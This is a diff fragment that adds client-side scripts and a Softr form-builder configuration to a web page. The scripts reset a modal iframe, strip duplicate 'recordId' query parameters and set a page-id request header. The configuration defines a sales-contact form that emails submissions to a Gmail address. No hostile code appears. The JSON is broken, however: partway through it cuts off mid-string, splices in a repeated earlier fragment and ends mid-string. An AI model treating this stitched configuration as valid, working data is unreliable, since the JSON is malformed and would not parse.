+        modalContainer.classList.add('sw-modal-size-' + size);
+
+        setTimeout(() => {
+            // Add event listener to detect when the modal is closed
+            const closeButton = document.querySelector('.sw-modal-close');
+            const backdrop = document.querySelector('.sw-modal-overlay');
+
+            closeButton.addEventListener('click', resetIframe);
+            backdrop.addEventListener('click', resetIframe);
+        }, 1000)
+
+    }
+
+    const resetIframe = () => {
+        const iframeElem = document.querySelector('.sw-modal-iframe');
+        iframeElem.removeAttribute('src');
+    }
+</script>
+
+<script>
+    /** Bugfix on multiple ?recordId= issue **/
+    setInterval(function () {
+        $('section a').each(function () {
+            const href = $(this).attr('href');
+            if (href && href.includes('?recordId=')) {
+                const countOfRecords = (href.match(/\?recordId=/g) || []).length;
+                if (countOfRecords > 1) {
+                    const index = href.lastIndexOf('?recordId=');
+                    const cleanedHref = href.substring(0, index);
+                    $(this).attr('href', cleanedHref);
+                }
+            }
+        });
+    }, 1000);
+</script>
+
+<script type="text/javascript">
+    if (window.jQuery && window.jQuery.ajaxSetup) {
+        window.jQuery.ajaxSetup({
+            beforeSend: function (xhr, settings) {
+                if (settings && settings.url && (
+                    settings.url.includes('/integrations/airtable/')
+                    || settings.url.includes('/v1/applications/1c5cbd69-6036-4f3f-be0b-fb7860be3d46')
+                    || settings.url.includes('/v1/comments')
+                    || settings.url.includes('/v3/comments')
+                    || settings.url.includes('/forms/form-to-email')
+                    || settings.url.includes('/forms/form-to-api'))
+                ) {
+                    xhr.setRequestHeader('softr-page-id', 'a6a1dcd4-091e-46c1-ae62-dee74abbfe29');
+                }
+            }
+        });
+    }
+  window['form1'] = {}; 
+var softrBlocks = [{"id":"e6943a73-fd4b-4a49-a29a-0df77985091b","version":"5.20.2","hrid":"form1","name":"conditionalForm","title":"Conditional Form","image":"https://assets.softr-files.com/assets/blocks/studio/conditional-form-thumbnail.jpg","category":"Form","keywords":"customizable form, simple, Action button, sales form, lead generation, marketing form","elements":{"definitions":{"label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"field":{"id":"","type":"short_text","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"placeholder":"","caption":{"value":"","enabled":false}},"dropdown":{"id":"","type":"auto_sync_dropdown","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","values":"","isRequired":true,"placeholder":"","caption":{"value":"","enabled":false},"multiSelect":false,"allowCustomOptions":false,"optionsOrder":"ASC","syncWithDataSource":null,"multiRecordsLink":null,"condition":{"logicalOperator":"OR","expressions":[],"enabled":false}},"checkboxField":{"id":"","type":"checkbox","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true},"enabled":false,"enabledToggleVariant":"plusMinus"},"name":"","isRequired":true,"placeholder":{"type":"text","value":"Please check this box","required":false,"label":"Description","useVariables":true},"defaultValue":{"type":"boolean","value":false,"label":"Checked by default","enabled":true}},"quickSelectField":{"id":"","type":"quick_select","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"caption":{"value":"","enabled":false},"selectedLayout":"STACKED","layoutOptions":["STACKED","FLOW","GRID"],"multiSelect":false,"optionsOrder":"ASC","syncWithDataSource":null,"multiRecordsLink":null,"values":"","condition":{"logicalOperator":"OR","expressions":[],"enabled":false}},"shortTextField":{"id":"","type":"short_text","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"caption":{"value":"","enabled":false},"placeholder":
+  {"type":"text","value":"Placeholder","required":false,"label":"Placeholder","enabled":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"text","value":"","required":false,"label":"Default value","enabled":false,"enabledToggleVariant":"plusMinus","useVariables":true},"validation":{"min":{"validation":{"type":"number","value":1,"required":false,"label":"Min characters","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"Please enter at least {min_characters} characters","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","defaultValue":"Please enter at least {min_characters} characters","requiredVariables":["{min_characters}"],"usePopover":true}},"max":{"validation":{"type":"number","value":150,"required":false,"label":"Max characters","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"Please enter no more than {max_characters} characters","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","usePopover":true,"defaultValue":"Please enter no more than {max_characters} characters","requiredVariables":["{max_characters}"]}},"custom":{"type":{"type":"select","value":"NONE","options":["NONE","CUSTOM","REGEX"],"label":"Custom validation"},"regex":"","condition":"","errorMessage":{"type":"text","value":"Please enter a valid value.","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","usePopover":true,"defaultValue":"Please enter a valid value.","isTextarea":true}}}},"longTextField":{"id":"","type":"long_text","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"caption":{"value":"","enabled":false},"placeholder":{"type":"text","value":"Placeholder","required":false,"label":"Placeholder","enabled":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"text","value":"","required":false,"label":"Default value","enabled":false,"enabledToggleVariant":"plusMinus","useVariables":true},"richText":{"type":"boolean","value":false,"label":"Rich text formatting","enabled":true},"validation":{"min":{"validation":{"type":"number","value":0,"required":false,"label":"Min characters","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"Please enter at least {min_characters} characters","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","usePopover":true,"defaultValue":"Please enter at least {min_characters} characters","requiredVariables":["{min_characters}"]}},"max":{"validation":{"type":"number","value":500,"required":false,"label":"Max characters","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"Please enter no more than 500 characters","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","usePopover":true,"defaultValue":"Please enter no more than {max_characters} characters","requiredVariables":["{max_characters}"]}},"custom":{"type":{"type":"select","value":"NONE","options":["NONE","CUSTOM","REGEX"],"label":"Custom validation"},"regex":"","condition":"","errorMessage":{"type":"text","value":"Please enter a valid value.","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","usePopover":true,"defaultValue":"Please enter a valid value.","isTextarea":true}}}},"urlField":{"id":"","type":"url","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"caption":{"value":"","enabled":false},"placeholder":{"type":"text","value":"Placeholder","required":false,"label":"Placeholder","enabled":false,"enabledToggleVariant":"plusMinus","useVariables":true},"defaultValue":{"type":"text","value":"","required":false,"label":"Default value","enabled":false,"enabledToggleVariant":"plusMinus","useVariables":true},"validation":{"invalidURLMessage":{"type":"text","value":"Please enter a valid URL","defaultValue":"Please enter a valid URL","required":false,"label":"'Invalid URL' message","enabled":false,"enabledToggleVariant":"arrow","useVariables":true,"usePopover":true},"custom":{"type":{"type":"select","value":"NONE","options":["NONE","CUSTOM","REGEX"],"label":"Custom validation"},"regex":"","condition":"","errorMessage":{"type":"text","value":"Please enter a valid URL","defaultValue":"Please enter a valid URL","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","useVariables":true,"usePopover":true}}},"baseURL":{"type":"text","value":"","required":false,"label":"Base URL","enabled":false,"enabledToggleVariant":"plusMinus","useVariables":true}},"numberField":{"id":"","type":"number","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"caption":{"value":"","enabled":false},"placeholder":{"type":"text","value":"Placeholder","required":false,"label":"Placeholder","enabled":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"interpolatedNumber","value":null,"required":false,"label":"Default value","enabled":false,"enabledToggleVariant":"plusMinus"},"formatting":{"percentage":{"type":"boolean","value":false,"label":"Convert to percentage"},"decimalPlaces":{"type":"select","value":"3","options":["0","1","2","3","4","5","6","7","8","9","10"],"label":"Decimal places"},"showThousandSeparator":{"type":"boolean","value":false,"label":"Show thousand separators"},"prefix":{"type":"text","value":"","required":true,"enabled":false,"label":"Prefix","enabledToggleVariant":"plusMinus"},"suffix":{"type":"text","value":"","required":true,"enabled":false,"label":"Suffix","enabledToggleVariant":"plusMinus"},"allowNegative":
+  {"type":"boolean","value":false,"label":"Allow negative value"}},"validation":{"minValue":{"validation":{"type":"interpolatedNumber","value":1,"required":true,"label":"Min value","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"Please enter a number larger than {min_value}","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","isTextarea":true,"usePopover":true,"defaultValue":"Please enter a number larger than {min_value}","requiredVariables":["{min_value}"]}},"maxValue":{"validation":{"type":"interpolatedNumber","value":9999,"required":true,"label":"Max value","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"Please enter a number smaller than {max_value}","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","isTextarea":true,"usePopover":true,"defaultValue":"Please enter a number smaller than {max_value}","requiredVariables":["{max_value}"]}}}},"emailField":{"id":"","type":"email","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"caption":{"value":"","enabled":false},"placeholder":{"type":"text","value":"Placeholder","required":false,"label":"Placeholder","enabled":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"text","value":"","required":false,"label":"Default value","enabled":false,"enabledToggleVariant":"plusMinus","useVariables":true},"validation":{"invalidEmailMessage":{"type":"text","value":"Please enter a valid email","defaultValue":"Please enter a valid email","required":true,"label":"‘Invalid email’ message","enabled":true,"enabledToggleVariant":"arrow","useVariables":true,"usePopover":true,"info":"Message shown when the email format is invalid."},"emailDomainsAllowed":{"validation":{"type":"bubble","value":"","validator":"domain","placeholder":"","label":"Allow only specific email domains","enabled":false,"enabledToggleVariant":"plusMinus","info":"Use the email domain input we have in domain-restricted signup"},"errorMessage":{"type":"text","value":"Domain not allowed","defaultValue":"Domain not allowed","required":true,"label":"Error message","enabledToggleVariant":"arrow","enabled":true,"useVariables":true,"usePopover":true}},"custom":{"type":{"type":"select","value":"NONE","options":["NONE","CUSTOM","REGEX"],"label":"Custom validation"},"regex":"","condition":"","errorMessage":{"type":"text","value":"Please enter a valid email.","defaultValue":"Please enter a valid email.","required":true,"label":"Error message","enabledToggleVariant":"arrow","enabled":true,"useVariables":true,"usePopover":true}}}},"headingField":{"id":"","type":"short_text","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"placeholder":"","caption":{"value":"","enabled":false},"styles":[{"type":"group","styles":[{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.text.heading"},"label":"Font color","key":"title.color"},{"type":"control","controlType":"size","value":null,"fallback":{"type":"THEME","key":"config.size"},"options":["S","M","L"],"label":"Font size","key":"title.size"}],"expanded":false,"label":"Title"}]},"textField":{"id":"","type":"short_text","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"placeholder":"","caption":{"value":"","enabled":false},"styles":[{"type":"group","styles":[{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.text.description"},"label":"Font color","key":"description.color"},{"type":"control","controlType":"size","value":null,"fallback":{"type":"THEME","key":"config.size"},"options":["S","M","L"],"label":"Font size","key":"description.size"}],"expanded":false,"label":"Description"}]},"dividerField":{"id":"","type":"divider","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"placeholder":"","caption":{"value":"","enabled":false},"styles":[{"type":"group","styles":[{"type":"control","controlType":"border","label":"Border","styles":[{"type":"control","controlType":"borderWidth","value":null,"fallback":{"type":"VALUE","value":1},"options":[0,1,2,3,4,8,16],"label":"Width","key":"divider.borderWidth"},{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.input.background.idle"},"label":"Color","key":"divider.borderColor"}]}],"expanded":false,"label":"Divider"}]},"phoneNumberField":{"id":"","type":"phone_number","label":{"value":"Phone","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"caption":{"enabled":false,"value":""},"name":"","isRequired":true,"placeholder":{"type":"text","value":"Enter your phone number","required":false,"label":"Placeholder","enabled":false,"enabledToggleVariant":"plusMinus"},"defaultValue":{"type":"text","value":"","required":false,"label":"Default value","enabled":false,"enabledToggleVariant":"plusMinus","useVariables":true,"isTextarea":true},"options":{"fixedCountryCode":{"type":"boolean","value":false,"label":"Fixed country code"},"country":{"type":"countrySelect","value":"US","label":"Country"},"useLocalFormat":{"type":"boolean","value":false,"label":"Use local format"}},"validation":{"custom":{"type":{"type":"select","value":"NONE","options":["NONE","CUSTOM","REGEX"],"label":"Custom validation"},"regex":"","condition":"","errorMessage":{"type":"text","value":"Please enter a valid phone number","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","defaultValue":"Please enter a valid phone number","usePopover":true,"isTextarea":true}},"invalidPhoneNumberMessage":{"type":"text","value":"Please enter a valid phone number","info":"Message shown when the phone number format is invalid.","defaultValue":"Please enter a valid phone number","required":true,"label":"‘Invalid phone number’ message","enabled":false,"enabledToggleVariant":"arrow","usePopover":true,"isTextarea":true}}},"ratingField":{"id":"","type":"rating","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"caption":{"value":"","enabled":false},"options":{"shape":{"type":"coloredIcon","label":"Shape","value":{"icon":"star-01","color":"#FFB92D"}},"scale":{"type":"select","value":"5","label":"Scale","options":["1","2","3","4","5","6","7","8","9","10"]}}},"fileField":{"id":"","type":"file","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"caption":{"value":"Hint goes here","enabled":true},"placeholder":{"type":"text","value":"Upload","required":false,"label":"Placeholder","enabled":true,"enabledToggleVariant":"plusMinus"},"showFileAs":{"type":"cardSelect","value":"TILE","options":["TILE","BADGE"],"label":"Show uploaded files as","optionsMeta":{"TILE":{"imgSrc":"https://assets.softr-files.com/assets/blocks/studio/fields/tile.png","label":"Tile"},"BADGE":{"imgSrc":"https://assets.softr-files.com/assets/blocks/studio/fields/badge.png","label":"Badge"}}},"validation":{"fileTypes":{"validation":{"type":"multiSelect","value":[],"options":["IMAGES","VIDEOS","AUDIOS","FONTS"],"optionsMeta":{"IMAGES":{"label":"Images"},"VIDEOS":{"label":"Videos"},"AUDIOS":{"label":"Audios"},"FONTS":{"label":"Fonts"}},"enabled":false,"label":"Limit file types","info":"Only selected file types or categories will be allowed.","enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"File type not allowed","defaultValue":"File type not allowed","required":true,"label":"Error message","enabled":true,"enabledToggleVariant":"arrow","usePopover":true}},"fileSize":{"validation":{"type":"number","value":1,"required":false,"label":"Limit file size (MB)","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"File size must be smaller than {max_file_size}","defaultValue":"File size must be smaller than {max_file_size}","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","usePopover":true,"useVariables":true,"requiredVariables":["{max_file_size}"]}},"minNumberOfFiles":{"validation":{"type":"number","value":1,"required":false,"label":"Min file count","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"Please upload at least {min_files} file","defaultValue":"Please upload at least {min_files} file","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","usePopover":true,"useVariables":true,"requiredVariables":["{min_files}"]}},"maxNumberOfFiles":{"validation":{"type":"number","value":5,"required":false,"label":"Max file count","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"You can only upload up to {max_files} files","defaultValue":"You can only upload up to {max_files} files","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","usePopover":true,"useVariables":true,"requiredVariables":["{max_files}"]}}}},"step":{"id":"","name":"","header":{"image":{"url":""}},"conditions":[],"sections":[]},"section":{"id":"","name":"","conditions":{"visibility":"ALWAYS_VISIBLE","logicalOperator":"AND","expressions":[]},"fields":[{"id":"","type":"heading1","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"placeholder":"","caption":{"value":"","enabled":false},"styles":[{"type":"group","styles":[{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.text.heading"},"label":"Font color","key":"title.color"},{"type":"control","controlType":"size","value":null,"fallback":{"type":"THEME","key":"config.size"},"options":["S","M","L"],"label":"Font size","key":"title.size"}],"expanded":false,"label":"Title"}],"value":"Talk to a sales representative"},{"id":"","type":"text","label":{"value":"Label","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"","isRequired":true,"placeholder":"","caption":{"value":"","enabled":false},"styles":[{"type":"group","styles":[{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.text.description"},"label":"Font color","key":"description.color"},{"type":"control","controlType":"size","value":null,"fallback":{"type":"THEME","key":"config.size"},"options":["S","M","L"],"label":"Font size","key":"description.size"}],"expanded":false,"label":"Description"}],"value":"Have questions about pricing, plans, or our Awesome Product? Fill out the form and a sales representative will be in touch shortly"},{"id":"","type":"short_text","label":{"value":"Full name","icon":null,"tooltip":{"type":"text","value":"","required":false,"label":"Tooltip","enabled":false,"enabledToggleVariant":"plusMinus","placeholder":"Optional","usePopover":true}},"name":"NAME","isRequired":true,"placeholder":"Your name","caption":{"value":"","enabled":false}}]},"supportedFieldTypes":["short_text","email","long_text","url","file","checkbox","rating","auto_sync_dropdown","address","number","date","dateTime","phone_number","signature","rich_text","hidden","heading1","heading2","heading3","text","divider","quick_select"],"supportedFormEndingActions":["REFRESH","OPEN_DYNAMIC_EXTERNAL_URL","OPEN_DETAILS_PAGE","OPEN_PAGE"],"supportedFormEndingFields":["heading1","heading2","heading3","text"],"supportedFormEndingTypes":["SUCCESS_MESSAGE","THANK_YOU_SCREEN","TRIGGER_WORKFLOW"]},"container":{"styles":[{"type":"group","styles":[{"type":"group","styles":[{"type":"control","controlType":"background","label":"Background","styles":[{"type":"control","controlType":"select","value":"IMAGE","fallback":{"type":"VALUE","value":"COLOR"},"options":["COLOR","IMAGE"],"optionsMeta":{"COLOR":{"label":"Solid color"},"IMAGE":{"label":"Image"}},"label":"Background style","key":"block.backgroundStyle"},{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.background.default"},"label":"Background color","key":"block.backgroundColor","visible":{"operator":"EQUALS","key":"block.backgroundStyle","value":"COLOR"}},{"type":"control","controlType":"image","value":"https://assets.softr-files.com/applications/1c5cbd69-6036-4f3f-be0b-fb7860be3d46/assets/8b8e162f-8286-477c-aa46-07e2887e625d.jpeg","fallback":{"type":"VALUE","value":null},"label":"Background image","key":"block.backgroundImage","visible":{"operator":"EQUALS","key":"block.backgroundStyle","value":"IMAGE"}},{"type":"control","controlType":"select","value":null,"fallback":{"type":"VALUE","value":"COVER"},"options":["COVER","CONTAIN","AUTO"],"optionsMeta":{"COVER":{"label":"Cover"},"CONTAIN":{"label":"Contain"},"AUTO":{"label":"Auto"}},"label":"Background image size","key":"block.backgroundImageSize","visible":{"operator":"EQUALS","key":"block.backgroundStyle","value":"IMAGE"}}]},{"type":"control","controlType":"padding","options":["NONE","S","M","L","XL"],"value":"XL","fallback":{"type":"THEME","key":"config.size"},"label":"Padding top","key":"block.paddingTop"},{"type":"control","controlType":"padding","options":["NONE","S","M","L","XL"],"value":"S","fallback":{"type":"THEME","key":"config.size"},"label":"Padding bottom","key":"block.paddingBottom"},{"type":"control","controlType":"size","value":"L","fallback":{"type":"VALUE","value":"M"},"options":["M","L"],"label":"Width","key":"block.width"},{"type":"control","controlType":"border","label":"Bottom border","styles":[{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.border.secondary"},"label":"Color","key":"block.borderColor"},{"type":"control","controlType":"borderStyle","value":null,"fallback":{"type":"VALUE","value":"solid"},"options":["none","solid"],"label":"Border style","key":"block.borderStyle"},{"type":"control","controlType":"borderWidth","value":null,"fallback":{"type":"VALUE","value":0},"options":[0,1,2,3,4,8,16],"label":"Border width","key":"block.borderWidth"}]},{"type":"group","styles":[{"type":"control","controlType":"roundness","value":null,"fallback":{"type":"THEME","key":"config.roundness"},"options":["NONE","SUBTLE","STANDARD","SMOOTH","CIRCULAR"],"label":"Roundness","key":"container.roundness"},{"type":"control","controlType":"boolean","value":null,"fallback":{"type":"THEME","key":"config.shadow"},"key":"container.shadow","label":"Shadow"},{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.dialog.background.idle"},"label":"Background color","key":"container.backgroundColor"},{"type":"control","controlType":"border","label":"Border","styles":[{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.border.primary"},"label":"Color","key":"container.borderColor"},{"type":"control","controlType":"borderStyle","value":null,"fallback":{"type":"VALUE","value":"solid"},"options":["none","solid","dashed","dotted"],"label":"Border style","key":"container.borderStyle"},{"type":"control","controlType":"borderWidth","value":null,"fallback":{"type":"VALUE","value":1},"options":[0,1,2,3,4],"label":"Border width","key":"container.borderWidth"}]}],"expanded":false,"key":"container","label":"Container","enabled":true}],"expanded":true,"label":"Block"},{"type":"group","styles":[{"type":"control","controlType":"size","value":null,"fallback":{"type":"THEME","key":"config.size"},"options":["S","M","L"],"label":"Size","key":"fields.size"},{"type":"control","controlType":"fontFamily","value":null,"fallback":{"type":"THEME","key":"tokens.typography.body.fontFamily"},"label":"Font family","key":"fields.fontFamily"},{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.input.text"},"label":"Color","key":"fields.fontColor"},{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.input.background.idle"},"label":"Background color","key":"fields.backgroundColor"},{"type":"control","controlType":"roundness","value":null,"fallback":{"type":"THEME","key":"config.roundness"},"options":["NONE","SUBTLE","STANDARD","SMOOTH","CIRCULAR"],"label":"Roundness","key":"fields.roundness"},{"type":"control","controlType":"border","label":"Border","styles":[{"type":"control","controlType":"borderWidth","value":null,"fallback":{"type":"VALUE","value":0},"options":[0,1,2,3,4,8,16],"label":"Border width","key":"fields.borderWidth"},{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.input.border.focus"},"label":"Color","key":"fields.borderColor"}]},{"type":"group","styles":[{"type":"control","controlType":"font","label":"Font","styles":[{"type":"control","controlType":"fontFamily","value":null,"fallback":{"type":"THEME","key":"tokens.typography.body.fontFamily"},"label":"Font family","key":"label.bodyFontFamily"},{"type":"control","controlType":"fontWeight","value":700,"fallback":{"type":"VALUE","value":500},"options":[100,200,300,400,500,600,700,800,900],"optionsMeta":{"100":{"label":"Hairline"},"200":{"label":"Thin"},"300":{"label":"Light"},"400":{"label":"Normal"},"500":{"label":"Medium"},"600":{"label":"Semibold"},"700":{"label":"Bold"},"800":{"label":"Extrabold"},"900":{"label":"Black"}},"label":"Font weight","key":"label.bodyFontWeight"},{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.text.description"},"label":"Color","key":"label.color"}]}],"expanded":false,"label":"Label"}],"expanded":false,"label":"Fields"},{"type":"group","styles":[{"type":"group","styles":[{"type":"control","controlType":"color","value":"#0771a8","fallback":{"type":"THEME","key":"tokens.colors.text.heading"},"label":"Font color","key":"title.color"},{"type":"control","controlType":"size","value":null,"fallback":{"type":"THEME","key":"config.size"},"options":["S","M","L"],"label":"Font size","key":"title.size"}],"expanded":false,"label":"Headings"},{"type":"group","styles":[{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.text.description"},"label":"Font color","key":"description.color"},{"type":"control","controlType":"size","value":null,"fallback":{"type":"THEME","key":"config.size"},"options":["S","M","L"],"label":"Font size","key":"description.size"}],"expanded":false,"label":"Text"},{"type":"group","styles":[{"type":"control","controlType":"border","label":"Border","styles":[{"type":"control","controlType":"borderWidth","value":null,"fallback":{"type":"VALUE","value":1},"options":[0,1,2,3,4,8,16],"label":"Width","key":"divider.borderWidth"},{"type":"control","controlType":"color","value":null,"fallback":{"type":"THEME","key":"tokens.colors.input.background.id
+  {"type":"boolean","value":false,"label":"Allow negative value"}},"validation":{"minValue":{"validation":{"type":"interpolatedNumber","value":1,"required":true,"label":"Min value","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"Please enter a number larger than {min_value}","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","isTextarea":true,"usePopover":true,"defaultValue":"Please enter a number larger than {min_value}","requiredVariables":["{min_value}"]}},"maxValue":{"validation":{"type":"interpolatedNumber","value":9999,"required":true,"label":"Max value","enabled":false,"enabledToggleVariant":"plusMinus"},"errorMessage":{"type":"text","value":"Please enter a number smaller than {max_value}","required":true,"label":"Error message","enabled":false,"enabledToggleVariant":"arrow","isTextarea":true,"usePopover":true,"defaultValue":"Please enter a number smaller than {max_value}","requiredVariables":["{max_value}"]}}}}]}]}],"endings":[{"id":"ending1","type":"SUCCESS_MESSAGE","action":"OPEN_PAGE","successMessage":"","name":"Ending 1","appendRecordId":false,"workflowConfigs":{"triggerId":"","workflowId":""},"path":"/proses-cetak-kupon","openInNewTab":false}],"sideSection":{"enabled":false,"backgroundImage":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/07.jpg","heading":{"enabled":false,"value":"Something important","variant":"title"},"text":{"enabled":false,"value":"Something less important"},"image":{"enabled":false,"value":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/05.jpg"},"video":{"enabled":false,"value":"https://youtu.be/0PahaXE5cVY?si=tj37ogj4scsYWc8N","thumbnailSrc":"https://assets.softr-files.com/assets/blocks/v5/mock-images/abstract/01.jpg"},"order":["heading","text","image","video"]}}},"type":"dynamic","collection":{"dataSources":[],"dataSource":{"supportedSourceTypes":["GOOGLE_SHEET","AIRTABLE","SMARTSUITE","HUBSPOT","MYSQL","POSTGRESQL","SQL_SERVER","SUPABASE","MARIADB","XANO_SQL","MONDAY","NOTION","SOFTR_TABLES","CLICKUP","CODA"],"type":"","airtable":{"url":"","baseId":"","tableName":"","viewName":""},"softr":{"applicationId":""},"isComplete":false,"id":""},"submissionConfig":{"mailchimp":{"url":"","type":"mailchimp"},"mailerlite":{"url":"","type":"mailerlite"},"zapierWebhook":{"url":"","type":"zapierWebhook"},"integromatWebhook":{"url":"","type":"integromatWebhook"},"email":{"url":"gebyarbri67@gmail.com","type":"email"},"callApiWebhook":{"url":"","type":"callApiWebhook"},"triggerWorkflow":{"workflowId":"","triggerId":"","type":"triggerWorkflow"}},"submitRestricted":false},"enabled":"true","order":"null","updated":[],"visibility":{"userGroup":{"predefinedUserGroupType":"ALL_USERS","customUserGroupIds":[],"enabledPredefinedUserGroupTypes":["ALL_USERS","LOGGED_IN_USERS","NON_LOGGED_IN_USERS"]},"devices":["laptop","tablet","mobile"],"detailsPageRecordCondition":null},"settings":{},"container":null,"presets":{"items":[{"name":"centered","image":"https://assets.softr-files.com/assets/blocks/studio/conditional-form/centered-preset-thumbnail.svg","title":"Centered","properties":{"elements":{"form":{"steps":[{"id":"step1","name":"Step 1","header":{"image":{"url":""}},"sections":[{"id":"step1-s1","name":"Section 1","fields":[{"id":"id-heading1","name":"","type":"heading1","label":{"icon":null,"value":"Label","tooltip":{"type":"text","label":"Tooltip","value":"","enabled":false,"required":false,"usePopover":true,"placeholder":"Optional","enabledToggleVariant":"plusMinus"}},"value":"Form title","styles":[{"type":"group","label":"Title","styles":[{"key":"title.color","type":"control","label":"Font color","value":null,"fallback":{"key":"tokens.colors.text.heading","type":"THEME"},"controlType":"color"},{"key":"title.size","type":"control","label":"Font 